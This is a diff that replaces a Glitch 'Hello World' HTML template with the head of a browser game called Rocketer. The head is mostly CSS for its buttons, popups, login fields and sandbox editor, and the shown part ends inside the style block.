@@ -1,72 +1,1944 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <!-- 
-      This is an HTML comment
-      You can write text in a comment and the content won't be visible in the page
-    -->
-
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <link rel="icon" href="https://glitch.com/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width, height=device-height, target-densitydpi=device-dpi" />
+    <meta name="application-name" content="rocketer.io" />
+    <meta name="description" content="Scenexe.io but bad." />
+    <title>Rocketer</title>
+    <link
+      rel="icon"
+      type="image/x-icon"
+      href="https://cdn.glitch.global/92cf917f-5d16-4251-8140-4f5181b6661b/favicon.png?v=1679492856483"
+    />
+    <style>
+      body {
+        user-select: none;
+        overscroll-behavior: none
+      }
 
-    <!--
-      This is the page head - it contains info the browser uses
-      Like the title, which appears on the browser tab but not inside the page
-      Further down you'll see the content that displays in the page
-    -->
-    <title>Hello World!</title>
+      *:focus {
+        /*prevent highlight when clicking on an input field*/
+        outline: none;
+      }
 
-    <!-- The website stylesheet -->
-    <link rel="stylesheet" href="/style.css" />
+      /*plaeholder for text input fields*/
+      ::-webkit-input-placeholder {
+        /* Edge */
+        color: darkgrey;
+        opacity: 1;
+      }
+      :-ms-input-placeholder {
+        /* Internet Explorer 10-11 */
+        color: darkgrey;
+        opacity: 1;
+      }
+      ::placeholder {
+        color: darkgrey;
+        opacity: 1;
+      }
+      
+      /*Scrollbars*/
+      ::-webkit-scrollbar {
+          width: 1vmin
+      }
 
-    <!-- The website JavaScript file -->
-    <script src="/script.js" defer></script>
+      ::-webkit-scrollbar-track {
+          background: #00000000
+      }
+
+      ::-webkit-scrollbar-thumb {
+          background: black;
+          border-radius: 1vmin
+      }
+
+      ::-webkit-scrollbar-thumb:hover {
+          background: #8f8f8f
+      }
+      
+      p {
+        margin-bottom: .3vw;
+        margin-top: .3vw;
+      }
+
+      #game {
+        position: fixed;
+        left: 0px;
+        top: 0px;
+        width: 100%;
+        height: 100%;
+        /*Note: this height and width refers to canvas.style.height and canvas.style.width, not the same as canvas.width and canvas.height*/
+      }
+
+      #homePage {
+        position: fixed;
+        left: 0px;
+        top: 0px;
+        width: 100%;
+        height: 100%;
+      }
+
+      #continue {
+        position: fixed;
+        bottom: 15%;
+        right: 46.5%;
+        background-color: white;
+        border: 0.2vw solid black;
+        color: black;
+        border-radius: 10px;
+        height: 2.3vw;
+        width: 7%;
+        font-size: 1.3vw; /*the words change size based on browser width*/
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        transition: 0.3s; /*transition speed for hover effect*/
+        display: none;
+        cursor: pointer;
+      }
+      #continue:hover {
+        background-color: darkgrey;
+      }
+
+      #changelog {
+        position: fixed;
+        bottom: 10px;
+        right: 15px;
+        background-color: #009900;
+        background-image: linear-gradient(0deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0) 50%, rgba(255,255,255,0.3) 51%);/*create a lighter shade for the top part of the button, 0.3 determine color*/
+        border: 0.2vw solid black;
+        color: white;
+        border-radius: 0.5vw;
+        height: 3.5vw;
+        width: 3.5vw;
+        font-family: Arial, sans-serif;
+        transition: 0.3s; /*transition speed for hover effect*/
+        cursor: pointer;
+        /*moving animation*/
+        animation-name: buttonAnimation;
+        animation-duration: 0.5s;
+      }
+      #changelog:hover {
+        background-color: #00b300;
+      }
+      @keyframes buttonAnimation {
+        from {
+          bottom: calc(10px - 8vw);
+        }
+        to {
+          bottom: 10px;
+        }
+      }
+
+      #changelogPopup {
+        display: none;
+        background-color: rgba(25, 25, 25, 0.5); /*do not use opacity property on its own or else the words also translucent*/
+        border: 0.3vw solid rgba(25, 25, 25);
+        color: white;
+        font-size: 1.3vw;
+        border-radius: 15px;
+        position: fixed;
+        top: 15%;
+        left: 25%;
+        width: 50%;
+        height: 70%;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        overflow-y: scroll; /*to allow scrolling if needed*/
+        padding: 1vw;
+        /*below code prevent padding from affecting width of popup*/
+        -webkit-box-sizing: border-box; /* Safari/Chrome, other WebKit */
+        -moz-box-sizing: border-box; /* Firefox, other Gecko */
+        box-sizing: border-box; /* Opera/IE 8+ */
+        /*moving animation*/
+        animation-name: popupAnimation;
+        animation-duration: 0.5s;
+      }
+      @keyframes popupAnimation {
+        from {
+          top: -70%;
+        }
+        to {
+          top: 15%;
+        }
+      }
+
+      #closePopup {
+        color: white;
+        position: absolute;
+        right: 1vw;
+        top: 1vw;
+        padding: 0.5vw;
+        cursor: pointer;
+        border-radius: 0.7vw;
+        background-color: rgb(69,69,69);
+        transition: 0.3s; /*transition speed for hover effect*/
+      }
+      #closePopup:hover {
+        background-color: rgb(100,100,100);
+      }
+
+      #howToPlay {
+        position: fixed;
+        bottom: 10px;
+        right: calc(15px + 4vw);
+        background-color: #b300b3;
+        background-image: linear-gradient(0deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0) 50%, rgba(255,255,255,0.3) 51%);/*create a lighter shade for the top part of the button, 0.3 determine color*/
+        border: 0.2vw solid black;
+        color: white;
+        border-radius: 0.5vw;
+        height: 3.5vw;
+        width: 3.5vw;
+        font-family: Arial, sans-serif;
+        transition: 0.3s; /*transition speed for hover effect*/
+        cursor: pointer;
+        /*moving animation*/
+        animation-name: buttonAnimation;
+        animation-duration: 0.6s;
+      }
+      #howToPlay > span {        
+        transform: rotate(10deg);
+      }
+      #howToPlay:hover {
+        background-color: #e600e6;
+      }
+
+      #settings {
+        position: fixed;
+        bottom: 10px;
+        right: calc(15px + 8vw);
+        background-color: grey;
+        background-image: linear-gradient(0deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0) 50%, rgba(255,255,255,0.3) 51%);/*create a lighter shade for the top part of the button, 0.3 determine color*/
+        border: 0.2vw solid black;
+        color: white;
+        border-radius: 0.5vw;
+        height: 3.5vw;
+        width: 3.5vw;
+        font-family: Arial, sans-serif;
+        transition: 0.3s; /*transition speed for hover effect*/
+        cursor: pointer;
+        /*moving animation*/
+        animation-name: buttonAnimation;
+        animation-duration: 0.7s;
+      }
+      #settings:hover {
+        background-color: darkgrey;
+      }
+
+      #settingsPopup {
+        display: none;
+        background-color: rgba(25, 25, 25, 0.5);
+        border: 0.3vw solid rgba(25, 25, 25);
+        color: white;
+        font-size: 1.2vw;
+        border-radius: 15px;
+        position: fixed;
+        top: 15%;
+        left: 38.5%;
+        width: 25%;
+        height: 70%;
+        font-weight: 400;
+        font-family: "Roboto", sans-serif;
+        overflow-y: scroll; /*to allow scrolling if needed*/
+        padding: 2vw;
+        /*below code prevent padding from affecting width of popup*/
+        -webkit-box-sizing: border-box; /* Safari/Chrome, other WebKit */
+        -moz-box-sizing: border-box; /* Firefox, other Gecko */
+        box-sizing: border-box; /* Opera/IE 8+ */
+        text-align: center;
+        /*moving animation*/
+        animation-name: popupAnimation;
+        animation-duration: 0.5s;
+      }
+
+      #closeSettingsPopup {
+        color: white;
+        position: absolute;
+        right: 1vw;
+        top: 1vw;
+        padding: 0.5vw;
+        cursor: pointer;
+        border-radius: 0.7vw;
+        background-color: rgb(69,69,69);
+        transition: 0.3s; /*transition speed for hover effect*/
+      }
+      #closeSettingsPopup:hover {
+        background-color: rgb(100,100,100);
+      }
+      #closeSettingsPopup>div {
+          filter: brightness(100);
+      }
+      
+      #wrlb {
+        position: fixed;
+        bottom: 10px;
+        right: calc(15px + 20vw);
+        background-color: DarkGoldenRod;
+        background-image: linear-gradient(0deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0) 50%, rgba(255,255,255,0.3) 51%);/*create a lighter shade for the top part of the button, 0.3 determine color*/
+        border: 0.2vw solid black;
+        color: white;
+        border-radius: 0.5vw;
+        height: 3.5vw;
+        width: 3.5vw;
+        font-family: Arial, sans-serif;
+        transition: 0.3s; /*transition speed for hover effect*/
+        cursor: pointer;
+        /*moving animation*/
+        animation-name: buttonAnimation;
+        animation-duration: 1s;
+      }
+      #wrlb:hover {
+        background-color: rgba(224,174,51);
+      }
+
+      #wrlbPopup {
+        display: none;
+        background-color: rgba(25, 25, 25, 0.5);
+        border: 0.3vw solid rgba(25, 25, 25);
+        color: white;
+        font-size: 1.2vw;
+        border-radius: 15px;
+        position: fixed;
+        top: 15%;
+        left: 25%;
+        width: 50%;
+        height: 70%;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        overflow-y: scroll; /*to allow scrolling if needed*/
+        padding: 2vw;
+        /*below code prevent padding from affecting width of popup*/
+        -webkit-box-sizing: border-box; /* Safari/Chrome, other WebKit */
+        -moz-box-sizing: border-box; /* Firefox, other Gecko */
+        box-sizing: border-box; /* Opera/IE 8+ */
+        text-align: center;
+        /*moving animation*/
+        animation-name: popupAnimation;
+        animation-duration: 0.5s;
+      }
+
+      #closewrlbPopup {
+        color: white;
+        position: absolute;
+        right: 1vw;
+        top: 1vw;
+        padding: 0.5vw;
+        cursor: pointer;
+        border-radius: 0.7vw;
+        background-color: rgb(69,69,69);
+        transition: 0.3s; /*transition speed for hover effect*/
+      }
+      #closewrlbPopup:hover {
+        background-color: rgb(100,100,100);
+      }
+
+      #accounts {
+        position: fixed;
+        bottom: 10px;
+        right: calc(15px + 24vw);
+        background-color: chocolate;
+        background-image: linear-gradient(0deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0) 50%, rgba(255,255,255,0.2) 51%);/*create a lighter shade for the top part of the button, 0.3 determine color*/
+        border: 0.2vw solid black;
+        color: white;
+        border-radius: 0.5vw;
+        height: 3.5vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        transition: 0.3s; /*transition speed for hover effect*/
+        cursor: pointer;
+        /*moving animation*/
+        animation-name: buttonAnimation;
+        animation-duration: 1.1s;
+      }
+      #accounts:hover {
+        background-color: #e68c4d;
+      }
+
+      #accountsPopup {
+        display: none;
+        background-color: rgba(25, 25, 25, 0.5);
+        border: 0.3vw solid rgba(25, 25, 25);
+        color: white;
+        font-size: 1.2vw;
+        border-radius: 15px;
+        position: fixed;
+        top: 15%;
+        left: 25%;
+        width: 50%;
+        height: 70%;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        overflow-y: scroll; /*to allow scrolling if needed*/
+        padding: 2vw;
+        /*below code prevent padding from affecting width of popup*/
+        -webkit-box-sizing: border-box; /* Safari/Chrome, other WebKit */
+        -moz-box-sizing: border-box; /* Firefox, other Gecko */
+        box-sizing: border-box; /* Opera/IE 8+ */
+        /*moving animation*/
+        animation-name: popupAnimation;
+        animation-duration: 0.5s;
+      }
+
+      #closeAccountsPopup {
+        color: white;
+        position: absolute;
+        right: 1vw;
+        top: 1vw;
+        padding: 0.5vw;
+        cursor: pointer;
+        border-radius: 0.7vw;
+        background-color: rgba(128, 128, 128, 0.8);
+      }
+
+      #accountBox {
+        color: white;
+        position: relative;
+        margin: auto;
+        width: 95%;
+        padding: 0.5vw;
+        border-radius: 1vw;
+        text-align: center;
+        top: 20px; /*space between boxes*/
+      }
+      #wrwords {
+        color: white;
+        position: relative;
+        margin: auto;
+        width: 95%;
+        padding: 0.5vw;
+        border-radius: 1vw;
+      }
+
+      #discord {
+        position: fixed;
+        bottom: 10px;
+        right: calc(15px + 12vw);
+        background-color: #2a3aef;
+        background-image: linear-gradient(0deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0) 50%, rgba(255,255,255,0.2) 51%);/*create a lighter shade for the top part of the button, 0.3 determine color*/
+        border: 0.2vw solid black;
+        color: white;
+        border-radius: 0.5vw;
+        height: 3.5vw;
+        width: 3.5vw;
+        font-family: Arial, sans-serif;
+        transition: 0.3s; /*transition speed for hover effect*/
+        cursor: pointer;
+        /*moving animation*/
+        animation-name: buttonAnimation;
+        animation-duration: 0.8s;
+      }
+      #discord:hover {
+        background-color: #5865f2;
+      }
+      #reddit {
+        position: fixed;
+        bottom: 10px;
+        right: calc(15px + 16vw);
+        background-color: #d13902;
+        background-image: linear-gradient(0deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0) 50%, rgba(255,255,255,0.2) 51%);/*create a lighter shade for the top part of the button, 0.3 determine color*/
+        border: 0.2vw solid black;
+        color: white;
+        border-radius: 0.5vw;
+        height: 3.5vw;
+        width: 3.5vw;
+        font-family: Arial, sans-serif;
+        transition: 0.3s; /*transition speed for hover effect*/
+        cursor: pointer;
+        /*moving animation*/
+        animation-name: buttonAnimation;
+        animation-duration: 0.9s;
+      }
+      #reddit:hover {
+        background-color: #ff5500;
+      }
+      #openEditor {
+        position: fixed;
+        bottom: 5px;
+        left: 5px;
+        background-color: #0092C3;
+        border: 0.2vw solid black;
+        color: white;
+        border-radius: 0.8vw;
+        height: 3vw;
+        width: 3vw;
+        font-family: Arial, sans-serif;
+        transition: 0.3s; /*transition speed for hover effect*/
+        cursor: pointer;
+        display: none;
+        /*moving animation*/
+        animation-name: buttonAnimation2;
+        animation-duration: 0.9s;
+      }
+      #openEditor:hover {
+        background-color: #00B0E1;
+      }
+      @keyframes buttonAnimation2 {
+        from {
+          bottom: calc(10px - 8vw);
+        }
+        to {
+          bottom: 5px;
+        }
+      }
+
+      #notifFlex {
+        position: fixed;
+        top: 15px;
+        left: 0px;
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      /*above is to style the notification container, below is to style the notification*/
+      .alert {
+        color: white;
+        opacity: 0.75;
+        text-align: center;
+        font-weight: 900;
+        font-family: "Roboto", sans-serif;
+        border-radius: 0.6vw;
+        font-size: 1.3vw; /*the words change size based on browser width*/
+        padding: 2.5px 15px;
+        margin: 6px;
+        animation-name: animateNotif;
+        animation-duration: 1s;
+        transition-timing-function: ease-in-out;
+      }
+      @keyframes animateNotif {
+        0% {
+          opacity: 0;
+          max-height: 0;/*dont use height*/
+        }
+        50% {
+          opacity: 0.75;
+        }
+        100% {
+          max-height: 100px;/*set this value to a value that will be bigger than the height is*/
+        }
+      }
+
+      #play {
+        position: fixed;
+        top: calc(1920/100*2.9px + 50%);/*not the actual value, this value is changed in clientcode.js when screen resize*/
+        left: 55.9%;
+        font-size: 1.5vw;
+        font-weight: 900;
+        padding: 0.37vw 0.3vw;
+        border: none;
+        background: #7bbcd1;
+        border-radius: 0.5vw;
+        font-family: "Roboto", sans-serif;
+        color: white;
+        display: none;
+        cursor: pointer;
+        /*Hover transition*/
+        -webkit-transition: all 0.3s ease-out;
+        -moz-transition: all 0.3s ease-out;
+        -o-transition: all 0.3s ease-out;
+        transition: all 0.3s ease-out;
+        /*moving animation*/
+        animation-name: movingplay;
+        animation-duration: 1s;
+      }
+      #play:hover {
+        background: #68a6ba;
+      }
+      @keyframes movingplay {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      #gamename {
+        position: fixed;
+        top: calc(1920/100*2.5px + 50%);
+        left: 39.6%;
+        width: 14%;
+        font-size: 1.5vw;
+        font-weight: 900;
+        font-family: "Roboto", sans-serif;
+        padding: 0.5vw 0.5vw;
+        padding-right: 6%;
+        background-color: white;
+        border: 0.25vw solid #000000;
+        border-radius: 0.5vw;
+        color: black;
+        display: none;
+        /*moving animation*/
+        animation-name: movinginput;
+        animation-duration: 1s;
+      }
+      @keyframes movinginput {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      #chat {
+        position: fixed;
+        top: 28%;
+        right: 0.5%;
+        width: 11.5%;
+        font-size: 1vw;
+        font-weight: 400;
+        font-family: "Roboto", sans-serif;
+        padding: 0.3vw 0.3vw;
+        background-color: rgba(30, 30, 30, .75);
+        border: 0.2vw solid #000000;
+        border-radius: 0.5vw;
+        color: white;
+        display: none;
+      }
+
+      #devtoken {
+        position: fixed;
+        bottom: 10px;
+        left: 10px;
+        width: 10vw;
+        font-size: 1vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        padding: 0.5vw 0.5vw;
+        background-color: lightgrey;
+        border: 0.15vw solid #000000;
+        border-radius: 10px;
+        color: black;
+      }
+      .hidetoken {
+          display: none;
+          position: fixed;
+          bottom: 50px;
+          left: 10px;
+          background-color: rgba(99,0,0,.5);
+          border-radius: 0.5vw;
+          font-weight: 700;
+          font-family: "Roboto", sans-serif;
+          font-size: 1vw;
+          color: white;
+          padding: 0.2vw 0.5vw;
+      }
+      #devtoken:hover + .hidetoken {
+          display: block;
+          animation-name: textappearAnimation;
+          animation-duration: 0.5s;
+      }
+
+      /*slider in settings*/
+      .radiantsizeslider {
+        width: 75%;
+        position: relative;
+        left: 12.5%;
+      }
+
+      .slider {
+        -webkit-appearance: none;
+        width: 100%;
+        height: 15px;
+        border-radius: 5px;
+        background: black;
+        border: black solid;
+        border-radius: 10px;
+        outline: none;
+        opacity: 0.7;
+        -webkit-transition: 0.2s;
+        transition: opacity 0.2s;
+      }
+
+      .slider:hover {
+        opacity: 1;
+      }
+
+      .slider::-moz-range-thumb {
+        width: 25px;
+        height: 25px;
+        border-radius: 50%;
+        background: dodgerblue;
+        cursor: pointer;
+      }
+      
+      .slider::-webkit-slider-thumb {
+          background: #FFFFFF;
+          -webkit-appearance: none;
+          appearance: none;
+          width:15px;
+          height:15px;
+          border-radius: 15px;
+          cursor: pointer;
+      }
+      
+      .slider::-webkit-slider-thumb {
+        background: #FFFFFF;
+        -webkit-appearance: none;
+        appearance: none;
+        width:15px;
+        height:15px;
+        border-radius: 50%;
+        cursor: pointer;
+      }
+
+      #respawnScoreDiv {
+        position: fixed;
+        top: 62%;
+        left: calc(50% - 10.5vw); /*half of width*/
+        width: 20vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1.1vw;
+        padding: 0.5vw 0.5vw;
+        border-radius: 15px;
+        color: white;
+        text-align: center;
+        display: none;
+        text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+      }
+
+      #signUp {
+        position: relative;
+        left: 41%;
+        font-size: 1.3vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        padding: 0.5vw 1.5vw;
+        border: none;
+        background: #7bbcd1;
+        border-radius: 0.5vw;
+        font-weight: bold;
+        color: white;
+        /*Hover transition*/
+        -webkit-transition: all 0.3s ease-out;
+        -moz-transition: all 0.3s ease-out;
+        -o-transition: all 0.3s ease-out;
+        transition: all 0.3s ease-out;
+        display: block;
+      }
+      #signUp:hover {
+        background: #68a6ba;
+      }
+      #logIn {
+        position: relative;
+        left: 42.5%;
+        font-size: 1.3vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        padding: 0.5vw 1.5vw;
+        border: none;
+        background: #7bbcd1;
+        border-radius: 0.5vw;
+        font-weight: bold;
+        color: white;
+        /*Hover transition*/
+        -webkit-transition: all 0.3s ease-out;
+        -moz-transition: all 0.3s ease-out;
+        -o-transition: all 0.3s ease-out;
+        transition: all 0.3s ease-out;
+        display: block;
+      }
+      #logIn:hover {
+        background: #68a6ba;
+      }
+      #editAccount {
+        position: relative;
+        left: 39%;
+        font-size: 1.3vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        padding: 0.5vw 1.5vw;
+        border: none;
+        background: #7bbcd1;
+        border-radius: 0.5vw;
+        font-weight: bold;
+        color: white;
+        /*Hover transition*/
+        -webkit-transition: all 0.3s ease-out;
+        -moz-transition: all 0.3s ease-out;
+        -o-transition: all 0.3s ease-out;
+        transition: all 0.3s ease-out;
+        display: none;
+      }
+      #editAccount:hover {
+        background: #68a6ba;
+      }
+
+      #accountUsername {
+        position: relative;
+        left: 36%;
+        width: 26%;
+        font-size: 1.3vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        padding: 0.3vw 0.3vw;
+        background-color: rgba(211, 211, 211, 0.5);
+        border: 0.2vw solid #000000;
+        border-radius: 0.5vw;
+        color: black;
+        display: none;
+      }
+      #accountPassword {
+        position: relative;
+        left: 36%;
+        width: 26%;
+        font-size: 1.3vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        padding: 0.3vw 0.3vw;
+        background-color: rgba(211, 211, 211, 0.5);
+        border: 0.2vw solid #000000;
+        border-radius: 0.5vw;
+        color: black;
+        display: none;
+      }
+      #accountDesc {
+        position: relative;
+        left: 36%;
+        width: 26%;
+        font-size: 1.3vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        padding: 0.3vw 0.3vw;
+        background-color: rgba(211, 211, 211, 0.5);
+        border: 0.2vw solid #000000;
+        border-radius: 0.5vw;
+        color: black;
+        display: none;
+      }
+
+      #logInButton {
+        position: relative;
+        left: 42.5%;
+        font-size: 1.3vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        padding: 0.5vw 1.5vw;
+        border: none;
+        background: #7bbcd1;
+        border-radius: 0.5vw;
+        font-weight: bold;
+        color: white;
+        /*Hover transition*/
+        -webkit-transition: all 0.3s ease-out;
+        -moz-transition: all 0.3s ease-out;
+        -o-transition: all 0.3s ease-out;
+        transition: all 0.3s ease-out;
+        display: none;
+      }
+      #logInButton:hover {
+        background: #68a6ba;
+      }
+
+      #accountName {
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1.2vw;
+        color: white;
+        position: relative;
+        top: calc(50% - 2vw);
+      }
+
+      .achievementDiv {
+        width: 30%;
+        height: 7vw;
+        border-radius: 1vw;
+        padding: 1vw 1.25vw 0.5vw 1.25vw;
+        border: 0.2vw solid #000000;
+        display: inline-block;
+        text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+      }
+      
+      .accountTitleThingy {
+        text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+      }
+
+      #theme {
+        padding:0.3vw 0.4vw;
+        font-size: 0.8vw;
+        color: white;
+        width: 8vw;
+        border-radius: 0.5vw;
+        border: 3px solid #000000;
+        background-color: #00000077;
+        font-weight: 400;
+        font-family: Roboto, sans-serif;
+      }
+
+      /*below two divs are for making screen darker when popup appear, e.g. changelog appear and disappear*/
+      #screenDarken {
+        position: fixed;
+        top: 0%;
+        left: 0%;
+        width: 100%;
+        height: 100%;
+        background-color: black;
+        opacity: 0.5;
+        display: none;
+        animation-name: popupAppear;
+        animation-duration: 0.5s;
+      }
+      @keyframes popupAppear {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 0.5;
+        }
+      }
+      #screenLighten {
+        position: fixed;
+        top: 0%;
+        left: 0%;
+        width: 100%;
+        height: 100%;
+        background-color: black;
+        opacity: 0;
+        display: none;
+        animation-name: popupDisappear;
+        animation-duration: 0.5s;
+      }
+      @keyframes popupDisappear {
+        from {
+          opacity: 0.5;
+        }
+        to {
+          opacity: 0;
+        }
+      }
+
+      #featuredyoutuber {
+        position: absolute;
+        top: 5%;
+        right: 7%;
+        height: 3.5vw;
+        width: 15%;
+        background-color: rgba(69, 69, 69, 0.5);
+        border: 0.2vw solid #000000;
+        color: white;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1vw;
+        border-radius: 2vw;
+        cursor: pointer;
+      }
+      #youtuberimage {
+        position: absolute;
+        top: 0%;
+        left: 0%;
+        height: 100%;
+        overflow: hidden;
+        border-radius: 50%;
+      }
+      #youtubername {
+        position: absolute;
+        top: 0%;
+        left: 30%;
+        padding: 0.5vw 0;
+      }
+
+      table {
+        table-layout: fixed;
+        width: 100%;
+        border-spacing: 1.7vw 0.5vw;
+      }
+      th,
+      td {
+        width: 5vw;
+      }
+      
+      /*the text that appears when you hover over a button, e.g. changelog button*/
+      .hide {
+        display: none;
+        position: fixed;
+        bottom: calc(15px + 3.5vw);
+        right: 15px;
+        background-color: rgba(0,0,0,.5);
+        border-radius: 0.5vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1vw;
+        color: white;
+        padding: 0.2vw 0.5vw;
+      }
+
+      #changelog:hover + .hide {
+        display: block;
+        animation-name: textappearAnimation;
+        animation-duration: 0.5s;
+      }
+      
+      .hide2 {
+        display: none;
+        position: fixed;
+        bottom: calc(15px + 3.5vw);
+        right: calc(15px + 2.5vw);
+        background-color: rgba(0,0,0,.5);
+        border-radius: 0.5vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1vw;
+        color: white;
+        padding: 0.2vw 0.5vw;
+      }
+
+      #howToPlay:hover + .hide2 {
+        display: block;
+        animation-name: textappearAnimation;
+        animation-duration: 0.5s;
+      }
+      
+      .hide3 {
+        display: none;
+        position: fixed;
+        bottom: calc(15px + 3.5vw);
+        right: calc(15px + 7.5vw);
+        background-color: rgba(0,0,0,.5);
+        border-radius: 0.5vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1vw;
+        color: white;
+        padding: 0.2vw 0.5vw;
+      }
+
+      #settings:hover + .hide3 {
+        display: block;
+        animation-name: textappearAnimation;
+        animation-duration: 0.5s;
+      }
+      
+      .hide4 {
+        display: none;
+        position: fixed;
+        bottom: calc(15px + 3.5vw);
+        right: calc(15px + 7.5vw);
+        background-color: rgba(0,0,0,.5);
+        border-radius: 0.5vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1vw;
+        color: white;
+        padding: 0.2vw 0.5vw;
+      }
+
+      #discord:hover + .hide4 {
+        display: block;
+        animation-name: textappearAnimation;
+        animation-duration: 0.5s;
+      }
+      
+      .hide5 {
+        display: none;
+        position: fixed;
+        bottom: calc(15px + 3.5vw);
+        right: calc(15px + 11.5vw);
+        background-color: rgba(0,0,0,.5);
+        border-radius: 0.5vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1vw;
+        color: white;
+        padding: 0.2vw 0.5vw;
+      }
+
+      #reddit:hover + .hide5 {
+        display: block;
+        animation-name: textappearAnimation;
+        animation-duration: 0.5s;
+      }
+      
+      .hide6 {
+        display: none;
+        position: fixed;
+        bottom: calc(15px + 3.5vw);
+        right: calc(15px + 15.5vw);
+        background-color: rgba(0,0,0,.5);
+        border-radius: 0.5vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1vw;
+        color: white;
+        padding: 0.2vw 0.5vw;
+      }
+
+      #wrlb:hover + .hide6 {
+        display: block;
+        animation-name: textappearAnimation;
+        animation-duration: 0.5s;
+      }
+      
+      .hide7 {
+        display: none;
+        position: fixed;
+        bottom: calc(15px + 3.5vw);
+        right: calc(15px + 25vw);
+        background-color: rgba(0,0,0,.5);
+        border-radius: 0.5vw;
+        font-weight: 700;
+        font-family: "Roboto", sans-serif;
+        font-size: 1vw;
+        color: white;
+        padding: 0.2vw 0.5vw;
+      }
+
+      #accounts:hover + .hide7 {
+        display: block;
+        animation-name: textappearAnimation;
+        animation-duration: 0.5s;
+      }
+      
+      @keyframes textappearAnimation {
+        from {
+          opacity: 0.0;
+        }
+        to {
+          opacity: 1.0;
+        }
+      }
+      
+      .sandboxText {
+        position: absolute;
+        text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+      }
+      .sandboxText2 {
+        position: absolute;
+      }
+      .sandboxHover{
+        position: absolute;
+        display: none;
+        background-color: rgba(0,0,0,.5);
+        padding: 0.5vw 1vw;
+        border-radius: 0.5vw;
+        font-weight: 500;
+        font-size: 0.5vw;
+        animation-name: textappearAnimation;
+        animation-duration: 0.3s;
+      }
+      .sandboxInput {
+        padding:0.3vw 0.4vw;
+        font-size: 0.8vw;
+        color: white;
+        position: absolute;
+        width: 8vw;
+        border-radius: 0.5vw;
+        border: 3px solid black;
+        background-color: rgba(0,0,0,.5);
+        font-weight: 400;
+        font-family: Roboto, sans-serif;
+      }
+      .sandboxButton {
+        padding:0.3vw 0.4vw;
+        font-size: 0.8vw;
+        color: white;
+        position: absolute;
+        width: 8vw;
+        border-radius: 0.5vw;
+        border: 3px solid black;
+        background-color: rgba(0,0,0,.5);
+        /*Hover transition*/
+        -webkit-transition: all 0.3s ease-out;
+        -moz-transition: all 0.3s ease-out;
+        -o-transition: all 0.3s ease-out;
+        transition: all 0.3s ease-out;
+        cursor: pointer;
+        font-weight: 700;
+        font-family: Roboto, sans-serif;
+        font-size: 1vw;
+      }
+      .sandboxButton:hover {
+        background-color: rgba(69,69,69,.5);
+      }
+      .sandboxSelect {
+        padding:0.3vw 0.4vw;
+        font-size: 0.8vw;
+        color: white;
+        position: absolute;
+        width: 8vw;
+        border-radius: 0.5vw;
+        border: 3px solid black;
+        background-color: rgba(0,0,0,.5);
+        font-weight: 400;
+        font-family: Roboto, sans-serif;
+      }
+      .sandboxStack {/*for barrel editing UI*/
+        position: relative;
+        text-shadow: -0.2vmin -0.2vmin 0 #000, 0 -0.2vmin 0 #000, 0.2vmin -0.2vmin 0 #000, 0.2vmin 0 0 #000, 0.2vmin 0.2vmin 0 #000, 0 0.2vmin 0 #000, -0.2vmin 0.2vmin 0 #000, -0.2vmin 0 0 #000;
+      }
